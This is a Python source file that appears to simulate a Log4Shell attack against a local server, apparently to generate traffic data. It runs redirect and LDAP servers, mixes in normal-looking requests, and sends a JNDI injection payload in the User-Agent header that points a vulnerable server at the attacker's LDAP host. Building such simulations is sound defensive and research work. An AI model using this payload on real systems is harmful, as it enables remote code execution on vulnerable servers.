import scenarios.log4shell.sim.build_servers as bs
from models.base_simulation import BaseSimulation
import asyncio, random, requests
from threading import Thread

class LOG4SHELL(BaseSimulation):
    def __init__(self):
        super().__init__()
        self.url = 'http://localhost:8080'
        self.paths = ['/', '/api', '/home', '/status', '/info']
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'curl/7.68.0',
            'PostmanRuntime/7.29.0',
            'Python-urllib/3.8',
            'Android Chrome/89.0'
        ]

        print('Starting Redirect Server')
        Thread(target=bs.start_http_server, daemon=True).start()
        print('Starting LDAP Server')
        self.ldap_proc = bs.start_ldap_server()

    def name(self) -> str:
        return 'LOG4SHELL'

    def get_data_dir(self):
        return 'log4shell'

    async def worker(self, session):
        await asyncio.sleep(random.uniform(0, 5))
        ua = random.choice(self.user_agents)
        path = random.choice(self.paths)
        pwn_value = f'test{random.randint(1, 200)}'

        headers = {'User-Agent': ua}
        params = {'pwn': pwn_value}

        async with session.get(f'{self.url}{path}', data=params, headers=headers) as response:
            await response.text()

    def call_exploit(self):
        headers = {
            'User-Agent': f'${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}'
        }

        try:
            requests.get(self.url, headers=headers, timeout=5)
        except Exception as e:
            print(f'[!] Request failed: {e}')

    def cleanup(self):
        if self.ldap_proc != None:
            self.ldap_proc.terminate()
